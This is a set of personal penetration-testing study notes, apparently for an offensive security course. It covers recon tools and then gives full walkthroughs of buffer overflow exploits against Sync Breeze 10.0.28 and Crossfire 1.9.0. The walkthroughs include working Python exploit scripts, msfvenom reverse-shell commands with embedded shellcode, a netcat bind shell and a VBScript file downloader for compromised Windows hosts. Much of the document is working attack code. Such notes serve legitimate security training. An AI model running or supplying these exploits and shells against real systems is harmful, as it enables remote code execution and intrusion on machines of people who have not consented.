# Master Notes

## Text Manipulation
### **Cut**
The "cut" command is a very useful tool used to split text based on certain delimitters that can be specified with arguments for example the following command will slice an /etc shadow revealing users on a system:
```cut -d ":" -f 1 /etc/passwd``` 

Before:
```
root:$6$Dg3C//iX$Xb3iok11zP0LiXvW.w/fHweiyKrpSE.0NNthRx4T4jj3IFawLJux1pSoippJ0di2nVHcSv9sK4L3RF2qf15ee/:17764:0:99999:7:::
daemon:*:17752:0:99999:7:::
bin:*:17752:0:99999:7:::
sys:*:17752:0:99999:7:::
sync:*:17752:0:99999:7:::
games:*:17752:0:99999:7:::
man:*:17752:0:99999:7:::
lp:*:17752:0:99999:7:::
mail:*:17752:0:99999:7:::
news:*:17752:0:99999:7:::
uucp:*:17752:0:99999:7:::
proxy:*:17752:0:99999:7:::
```
After
```
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
```
### **Awk**
the awk command is more robust, but has a bit more of a learning curve you can achieve the same results as the above command by using this in awk
```
cat /etc/shadow | awk -F ":" '{print $1}' 
```

### **VimDiff**
- CTRL+> Switch Windows
- ]+C Next Change
- ]+C Prev Change
- D+O Move change from previous window to the current
- D+P Current to prev

### **Web Tools**
download a file
```
curl -o \<FILENAME\> \<WEBSITE\> 
```
this tool also downloads file but can do downloads in parallel
```
axel -a -n 20 -o \<filename\> \<website\>
```
### **Hot tips**
- Nano (not better than vim)
  - CTRL+K=CUT
  - CTRL+U=PASTE
- ps -fC is the same as pgrep
- tail -f used to trail a file

## Bash Scripting
- ``` #!/bin/bash -x ``` means that it produces additional debug
- Variables are very useful, but even more powerful, you can use shell expansion to allocate commands to variables so that: ``` var=$(date) = var=`date` ```
  - if youre experiencing trpuble try adding the following to your ~/.bashrc 
```
shopt -s expand_aliases
```
- arguments are denpted with $1 and $2
- $? will be your exit status
- ```read``` will capture your user input
  - \-p specifies a prompt displayed to the user
  - \-s makes it silent (doesnt show user input)
### Flow control
**If statements** 
```
if <TEST> 
then 
   <ACTION> 
fi
```
- && (AND) only works in a successful command execution
- || (OR) can be added as a condition if command is unsuccessful 
  - or you can use it as a regular logical OR 

**For Loops**
```
for var-name in <LIST> 
do 
   <ACTION>
done
```
(FOR loops can be done in one liners using semicolons)
```
for ip in $(seq 1 10); do echo 11.22.33.$ip; done 
```
also you can use brace expansion
```
for ip in {1..10}; do echo 11.22.33.$ip; done 
```
**While Loops**
```
while [ $counter -le 10 ]
do
   echo "11.22.33.$counter" 
   ((counter++)) #arethmatic expansion
done
```
also dont forget with these loops ```-lt``` is thess than ```-le``` is less than or equal to

**Functions**
These are cool for object oriented programming (not writing the same stuff over and over) they can be declared in two ways (personal preference) 
```
function <FUNCTION NAME>
   { 
commands
}
```
OR 
```
<FUNCTION NAME> () {
commands
}
```
**Hot Tip**
remember all variables declared are global variables unless specified with the ```local``` tag 

## Passive
### The most boring part of the job

### Google hacking
- site: "only this site" 
- filetype: "Only this file type" (use site .php to find goodies, also .jsp, .cfm, and .pl)
- you can add "-" in front of a search to negate
- intitle: "index of" :parent directory" (directory listinng pages) 
- [Google Hacking DB](https://www.exploit-db.com/google-hacking-database) 
  
### Sites
- [Netcraft](https://www.netcraft.com/)
  - does DNS lookups and can assist with subdomains. 
- [Shodan](https://www.shodan.io/)
  - IOT search engine
- [SSL Test](ssllabs.com/ssltests/)
- [Pastebin](https://pastebin.com/)
- [Security Headers](https://securityheaders.com/)

### User Enumeration
 **The Harvester**

This is a pretty powerful tool that will search a specified  data source for possible usernames
```
theharvester -d megacorpone.com -b google
```
- ```\-b``` is for target domain
- ```\-d``` is for data source 

Kali has some doow wordlists baked in ton the /usr/share/wordlists folder

### Social Media Tools
- https://www.social-searcher.com/
- https://digi.ninja/projects/twofi.php
  - This tool runs through twitter accounts and generates a wordlist (requires twitter API key)
- github.com/initstring/linkedin2username 
  - tries to get info about a persons LinkedIn contacts (requires an account)
- osintframework.com
- [Maltego](https://www.maltego.com/ce-registration/)
  - This is already in kali, but you need an account to use it effectively, heres the registratuon link.

## Active Info Gathering
 **DNS**

the ```host``` command looks for an "A" tecord
    - you can specify any other record with ```\-t``` switch 
    - you can automate this with common hostname files

``` sudo apt install seclist``` for more comprehensive wordlists 

reverse lookups are pretty dope also and might work a bit more if you have a range youre looking at, look at the following

```
for ip in $(seq 0 254); do hosts 11.22.33.$ip; done | grep -v "not found"
```  
Due to the nature of DNS its pretty trusting and oftentimes allows zone transfers from strangers (if the systadmin is trippin) this is how youre gonna go about doing it
1. Find your Name servers ``` host -t ns megacorpone.com```
2. Then ypure gonna actually try to zone transver ```host -l ns1.megacorpone.com``` 

heres a handy script to do it for you
```
for SERVER in $(host -t ns $1 | cut -d " " -f4); do host -l $1 $SERVER | grep "has address"; done 
``` 

**DNS RECON**

dns recon is a handy python script that can also do this for you, try:
```
dnsrecon -d megacorpone.com -t axfr
```
- ```-d``` is domain
- ```-t``` is type

The ```dnsenum``` tool also has a lot of the same functionality

**Port Scanning**

if you have to LoL (Live off the Lan) sometime youre gonna have to use nc (Netcat)

TCP
```
nc -nvv -w 1 -z 11.22.33.44 80
```
- ``` -w ``` specifies connection timeout in seconds
- ``` -z ``` zero IO mode (dont send any data)

UDP
```
nv -nv -u -z -w 1 11.22.33.44 53
```
- ``` -u``` is UDP mode
- pretty unreliable with a firewall because it relies on an ICMP unreachable to call something closed

** Nmap**
the swiss army knife of pen testing

**Network Sweep**

```Nmap -sn <IP Range> -oG <FILE>``` This will perform a network sweep and output open hosts to a specified file.

If youd like to clean it up a bit and just get the IPs, try this 
```
grep Up <FILE> | cut -d " " -f 2 | head
```
Some useful nmap switches
- ```- A``` OS version detection, tracerote, script scanning
- ```--top-ports=<NUMBER>``` the top X ammount of ports
- ```-O``` OS Fingerprinting (kinda garbage tho)
- ```-sV``` Service Version

NSE (NMAP Scripting Engine) scripts are located in the /usr/share/nmap/scripts here are a couple examples
- ```--script=smb-os-discovery``` attempts to use SMB to fingerprint a device
- to check out some SMB vulns ```ls /usr/share/nmap/scripts/smb-vuln-*```
- ```--script=dns-zone-transfer``` does a zone transfer(obviously)
- ``` --script-help <NAME>``` looking up source and switches
- try ```--script vuln``` to use all vuln scripts

**Masscan**

Not installed by default on Kali
```
sudo apt install masscan
```
This is what youre gonna use when you want to make some shake 
```
masscan -p<PORT> <IP RANGE> --rate=1000 -e <INTERFACE> --router <GATEWAY IP>
```
- ```-r``` is rate of packet transmission

**NBT SCAN**

Netbios Scan 
```
nbtscan -r <IP Range>
```
- ```-r``` used to specify originating UDP port as 137 (used to query netbios name service)
  
**NFS**

forst youre gonna want to find out any boxes running RPC in the network
```
nmap -sV -p 111 --script=rpcinfo <IP Range>
```
nmap has three NFS scripts that can all be run at the same time if desired using
```
nmap -p 111 --script nfs* <IP RANGE>
```
if you fund a share of interest you can try mounting it to you local file system using 
```
 mount -o nolock <IP>:<FOLDER> <LOCAL FOLDER>
 ```
 - ```-o nolock``` disables file locking, which is needed for older file servers

Sometimes you wont have access to the files in the mounted directory, but file access is determined by UUID so you can do the following on your local machine:
1. Create a user 
2. change the users UUID in the /etc/passwd directory either using vim or...
  ```
  sudo sed -i -e 's/<CURRENT UUID>/<DESIRED UUID>/g' /etc/passwd
  ```
**SNMP**

Sometimes sysadmins are wack and use the old SNMP and dont update the authentication strings.THis is how you can SNMPwalk if you have the string
```
snmpwalk -c public -v1 -t 10 <IP> 
```
- ```-c``` is community string
- ```-v``` is SNMP version number
- ```-t10``` increases timeout to 10 sec

Here are a few useful SNMP queries.

Query Users: 
```
snmpwalk -c <STRING> -v<Ver_Number> <IP> 1.3.6.1.4.1.77.1.2.25
```
Query Running Processes:
```
snmpwalk -c <STRING> -v<Ver_Number> <IP> 1.3.6.1.2.1.25.4.2.1.2
```
Open TCP Ports:1
```
snmpwalk -c <STRING> -v<Ver_Number> <IP> 1.3.6.1.2.1.6.13.1.3
```
Installed Software:
```
snmpwalk -c <STRING> -v<Ver_Number> <IP> 1.3.6.1.2.1.25.6.3.1.2
```
## Vulnerability Scanning

### Auto Scanning
These are pretty useful as a first passthrough to get an idea of the security posture of an organization

**Nessus**

This isnt in the kali repos, but the .deb file can be downloaded from their site [here](https://www.tenable.com/downloads/nessus). Here are some steps youre gonna need to take to get it working
1. Browse to the site (hyperlinked above) and download the latest .debe file
2. Install the deb file using apt ```sudo apt install /home/$USER/Downloads/<FILENAME>```
3. Once its installed you have to start the service using ```sudo /etc/init.d/nessusd start```
4. Enter the following web address in your browser htt ps://localhost:8834
5. Accept the self signed certificate
6. Choose nessus essentials and set up
   
Notes
- to launch scans, lick the dropdoen next to start
- Regular scan only does common ports so in order to open the port range youre gonna want to click discovery in settings and change scan type to custom, afterwards go to port scanning and change range
- Filter exploit available in results, click the gear and remove groups. 
- Advanced scan lets you use plugins
## Web Apps
when enumerating web, its a good idea to find out
- programming language and frameworks
- web server software
- database software
- server OS

find sitemap: www.\<SITE\>.com/robots.txt

**Dirb**
dirbuster is a prety good web directory buster
heres an example
```
dirb www.<site>.com -r -z 10
```
```-r``` means non-recursive
```-z``` means 10 millisecond wait interval
 LFI

 **Simple HTTP servers in your current directory

 ```
python -m SimpleHTTPServer 8080
python3 -m http.server 8080
php -S 0.0.0.0:8080
ruby -run -e httpd . -p 8080
busybox httpd -f -p 8080
 ``` 
## Buffer Overflow

**General Purpose Registers**
- EAX: Arithmetic/logical instructions
- EBX: Base Pointer
- ECX: Count Register
- EDX: IO port addresing and mult/div
- ESI: Pointer of data and ***source*** in string copy operations
- EDI: pointer of data and ***destination*** in string copy operations
- ESP: Stack pointer, keeps track of the most recently used memory location using a pointer
- EBP: Base pointer, points to the top of the stack allowing process to access its own info using offsets
- EIP: Instruction pointer. points tot he next instruction for execution
  
## Windows Buffer Overflow
*With Sync Breeze Enterprise 10.0.28* 

The following will be on how to execute a windows buffer overflow from start to finish with no preexisting knowledge of application source code. We will demonstrate this by "fuzzing" the Sync Breeze web application. Given the application uses HTTP, all the requests are in clear text so we will do the following:
1. Start wireshark on the appropriate interface (with root privs of course)
2. Attempt a login and take note of what you use to login as you will need to search for that later
3. Open wireshark to find your attempted login packet, this query should help:
     - http contains POST 
4. follow the tcp stream and you should see a string resembling this: **username=AAAA&password=BBBBH** this is going to be the string that we will use to manipulate to evaluate the application for improper input handling as this is how th User/Pass is processed

Now that we've identified how the information is processed, we can try to inout our own malformed data. We will use a couple different things and its easier to understand if i outline them here. 
- ```msf-pattern_create```: this will breate a unique pattern of strings that will allow us to isolate the place in memory in which the ESP resides upon overflow.
- **Immunity Debugger**: this is a debugging application in which we will be using to trace the memory registers of our application.
- ```msf-venom```: This is what we will be using to create tje payload in which will spawn a reverse shell back to our netcat listener. 
- **Bad Characters** there are a few ascii characters that will cause an application to terminate the input of a certain field such as 0x00. These can only be found by running a list of them though the input script in sucession removing invalid characters until sucessful completion.
- **JMP**: this is a "Jump" instruction that when pointed to can be used to "Jump" to a desired ESP
- ```!mona modules ``` this is an Immunity Debugger command that we are gonna use to find all the DLLs used by SyncBreeze (we ned one without ASLR support and bad characters)
- ```msf-nasm_shell```: Used to find the JMP opcode

1. Now that we know what valid input looks like, we're gonna recreate that packet in a python script. This script will simply replicate out rrquest while continually increasing in size until we send a packet large enough to overflow the buffer. For this service it should be about 800 bytes. Also this script hard codes the target IP so youre gonna need to replace the instances of "10.11.0.22" with your target IP. Dont run the script until you nee step number two.
```
#!/usr/bin/python
import socket
import time
import sys
size = 100
while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    inputBuffer = "A" * size
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire
    fox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    \r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    s.close()
    size += 100
    time.sleep(10)
  except:
    print "\nCould not connect!"
    sys.exit()
```
2. In oder to pull off inspeciting the EIP were gonna need to pull up the application in Immunity DB using these steps:
   1. open your services window using CTRL+R > services.mcs
   2. Right click Sync Breeze > Start
   3. Next open your immunity debugger then click File > attatch > Find the service > highlight it > and attatch
   4. Note: while attached the debugger pauses execution of the program, to continue, press F9
3. once we find out the ammount we need to overwrite the buffer we can add a unique pattern of strings as to isolate the ESP. which we will accomplish with the following: ```msf-pattern_create -l 800``` where ```-l``` stands for the length in bytes. You will have to change the inputBuffer and the content line in your script to reflect the following
```
inputBuffer = <MSF PATTERN OUTPUT> 
content = "username=" + inputBuffer + "&password=A"
```
4. You wil then run the script again against the debugger and find the following string in your EIP: ```42306142``` and in order to find the space in the string you can either eyeball it or run the following command to query the string
```
msf-pattern_offset -l 800 -q 42306142
```
The output of the command shoulf look something like ```Exact match at offset 780``` which shows us the location of EIP upon Crash. we will test our control of EIP bu yodating some lines on our script. 
```
filler = "A" * 780
eip = "BBBB"
buffer = "C" * 16 
inputBuffer = filler + eip + buffer
```
upon execution of the script yet again we will find our new EIP is 42424242 or "BBBB" we now control EIP

5. Next we run into the issue of not having enough space to input our shell code. Right now the 16 bytes that the Cs take up isnt nearly enough to account for an entire payload so now we wil test a large payload against the service again to see if it changes the nbature of the crash,simple enough, just change the following line in your script 
```
  filler = "A" * 780
  eip = "BBBB"
  offset = "C" * 16
  buffer = "D" * (1500 -len(filler) - len(eip) - len(offset))  
  inputBuffer = filler + eip + offset + buffer
```
6. Now youre gonna need to find bad characters. As stated before these are characters that, if passed through the program, could bause it to terminate input before your intended consequences. I know this sucks, but the only way through it is to run the program through every character that you would use until youve weeded out the bad ones, so get ready to run that script over and over. Add the following to your script. 
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4
  inputBuffer = filler + eip + offset + badchars

```
In order to find bad characters you need to know where the program stopped reading, in order to do so right click the ESP and choose "Follow Dump" there you can 
inspect the hex for a non sequential character. in the case of the first passthough, it will be "\x0a" or the new line character. the full list of bad characters for this program will be ```\x00\x0A\x0D\x25\x26\x2B\x3D```.
7. You may have noticed while looking through the bad characters that the address in ESP may differ between crashed to in order to have a more solid approach we will take advantage of JMP. In order to do so we will.
   1. enter ```!mona modules``` into the query form (big white bar) of Immunity 
   2. next we must find an DLL without bad characters in the name and that is compules without memory protection which allows us to rely on the same addresses. See that  LIBSSP.DLL meets our needs, so we're gonna use that.
   3. now were gonna find a JMP opcode using:
```
kali@kali:~$ msf-nasm_shell
nasm > jmp esp
```

   4. Using that command should give us the output ```FFE4``` in which we will use in immunity debugger to find our answer using 
```
!mona find -s “\xff\xe4” -m “libspp.dll” 
```  
  5. Finaly, we have our jump instruction ```0x10090c83``` in which we can place in the EIP portion of our code to give us a reliabe place to land. time to update the script yet again with the following (this is imputted backwards because of little endian)
```
eip = "\x83\x0c\x09\x10"
```
8. Now things are getting interesting. we need to make shellcode. we will do so in msf venom, as we go through our payload options the tcp reverse shell looks interesting, and encode it using shikata to keep put the bad characters we uncovered earlier. We can acomplish all of that with one command. we will place it in our script much like we did the bad chars, but first we need to do step 9
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"

```
9. encoding your payload introduces a element of intricacy in the code and when youre doing something that wasnt meant to be done in the first place, inctricacy can make it even harder. We can subvert many of the problems weith having an encoded payload by using what many refer to as a NOP sled (represented by \x90), note these are easily detected and will be fladded by many antivirus systems nowadays your final code should look something a little like this. Run it, toss a NC listener up on your attach machine using ```sudo nc -lnvp 443``` and you should have access equivalent to the process (system)
```
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer with %s bytes" % size
  shellcode = ("\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
"\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"
"\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"
"\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"
"\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"
"\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"
"\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"
"\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"
"\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"
"\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"
"\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"
"\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"
"\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"
"\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"
"\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"
"\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"
"\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"
"\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"
"\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"
"\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"
"\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"
"\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"
"\x5f\xa3\x05\x74\x5f\xe6")
 
  filler = "A" * 780
  eip = "\x83\x0c\x09\x10"
  offset = "C" * 4
  nops = "\x90" * 10

  inputBuffer = filler + eip + offset + nops + shellcode

  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire
  fox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  \r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  s.close()
except:
  print "\nCould not connect!"
```
## Linux Buffer Overflow
*With Crossfire 1.9.0*

Recent Linux Kernels (Anything youre gonna encounter in this day ain age) have implemented many memory protection schemes including
- DEP: Data Execution Protection
- ASLR: Address Space Layout Randomization
- Stack Canaries

Setup for this is going to be similar to that of the windows buffer overflow with the main differences being that we will be using EDB as our debugger, and relying on a public vulnerability to exploit the application. We are doing this on easy mode as a proof of concept so this application is compiled without DEP/ASLR.

1. Open your debian machine and open crossfire by typing ```/usr/games/crossfire/bin/crossfire``` into a terminal
2. Run EDB by simply typing ```edb``` into a second terminal and attach it as you would the Immunity DB
3. We will run the following script against the crossfire service in our attack machine, make sure to change the IP to your target. Sucessful execution of the code will be indicated by a popup in your EDB showing a crash and a valie of 41414141 in your EIP
```
#!/usr/bin/python
import socket
host = "10.11.0.128"
crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
```
4. Now that we have confirmed our crash we cna replace the crash variable with a pattern generated using msf. If we lookk at the crash variable declaration we can see that is it simply 4379 bits of the unicode representation of "A". We're gonna change that to a pattern variable that is equivalent to the output of: 
```
msf-pattern_create -l 4379
```
**\*\*Note\*\*:** Dont forget to change the crash variable in the buffer declaration to the name of the pattern variable

5. After running the updated script we get a variable of ```46367046``` in our EIP and after running the command ```msf-pattern_offset -l 4379 -q 46367046``` we see that this chunk resides at the offset of 4368 bits
6. These next steps are a bit tricky, and require a fairly good interpretation of these registers and opcodes to fully appreciate the exploit. Our ESP register points towards the end of our buffer and if we try to test a buffer increase like our last example we see that it changes the nature of the crast and foils our plan so we need to find a different way. When we look at our other registers we se that the EAX register points to the beginning, but has that psky "setup sound" string. In order to get around this we will use the last fre bytes of our string to arrange a 1st stage payload which will jump to the EAX register, BUT will add 12 bytes of space which allows us to skip the "setup sound" and land in a clean set of code.
7. In order to set up this first stahe payload we need to find the opcodes that will perform this action.This can easily be achieved by the following
```
kali@kali:~$ msf-nasm_shell
nasm > add eax,12
nasm > jmp eax
```
this will return us the opcodes ```83C00C``` and ```FFE0``` respectively which only take up 5 bytes of memory (we wil pad the other two with NOPs)

8. Next we will have to find bad characters again, it is the exact same as windoes so im not gonna bore you with it. The bad characters are ```\x00\x20``` though
9. Next we need to find a valid JMP for the EIP we will use the build in OpcodeSearcher in EDP. Press CTRL+O > Click the first crossfire start address > change the dropdown to ESP->EIP > and click find. The first valid JMP should be ```08134596```
10. before we add all the pieces to the puzzle we will finish by creating the actual payload and just like Windows we will be using MSFVenom. Use the following command where 
      - ```-p``` is the payload
      - ```-b`` is bad characters
      - ```-f``` is output format
      - ```-v``` is variable name 
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
```
11. Your final code should look something like this (with the appropriate IP of course). Start crossfire up without a debugger and fire it. 
```
#!/usr/bin/python
import socket

host = "10.11.0.128"

nop_sled = "\x90" * 8

shellcode = ""
shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
shellcode += "\x7f\x6d\x02\x36"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
 
s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"

```
## Locating public exploits
**Online**
- [The Exploit Database](https://www.exploit-db.com)
  - Hosted and maintained by Offenseive security
- [Security Focus Exploit Archives](https://www.securityfocus.com)
  - Mainlyy for vulnerabilities, but can link to proof of concept code
- [Packets Storm](https://packetstorm.com)
  - Hosts some proof of concept, but slso hosts tools

**Offline**
- Searchsploit
  - Kali keeps an archive of the exploitdb code, make sure to ```sudo apt update exploitdb```
  - code us hosted in /usr/share/exploitdb, this kinda sucks to go through manually so searchsploit is a thing (ex ```searchsploit remote smb microsoft windows```)
- Nmap NSE scrips
  - hosted in /usr/share/nmap/scripts
- Browser Exploitation Framework (BEEF)
  - start using ```sudo beef-xss```
  
## Fixing Exploits

**Memory Corruption Exploits**
*With Sync Breeze Enterprise 10.0.28* 

**Cross Complilation** 

In our kali machines we're gonna begin by searching for an exploit in the exploit db for syncbreeze using ```searchsploit "Sync Breeze Enterprise 10.0.28"``` where we find an exploit developed in C at ```windows/dos/42341.c```. Searchsploit has a cool functionality that lets you mirror an exlpoit to your home directory as such ```searchsploit -m 42341```

While inspecting the headers of the file we see that it was meant to compile on windows *insert Black Panther we dont do that here* so we gotta cross compile and the tool ```mingw-w64``` can help us do that so we ensure its installed and run the following command:
```
i686-w64-mingw32-gcc 42341.c -o <NAME YOU WANT>.exe -lws2_32
```
- ```-o``` is the file you wish to output to
- ```-lws2_32``` helps linker find winsock lib **tool will fail w/o this parameter**

## File Transfer
**Linux**

In a non-interactive shell your biggest problem is that for many processes you would like to access they require user input which could completley bork your session. Thankfully most linux hosts today need python for several functions so it is installed along with the pty package which is used to pop a "psuedo terminal". To try it out pop a netcat listener on a remote machine using the following
```
nc -lvvnp 4444 -e /bin/bash
```
then you will connect to the listener on your kali box using
```
nc -vvn 192.168.204.44 4444
```
and finally pop your pty using 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Boom interactive shell!

transfer your files now using scp my dude

**Windows**

Once you have a netcat session established you can utulize the following non-interactive commands to set up an http downloader
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
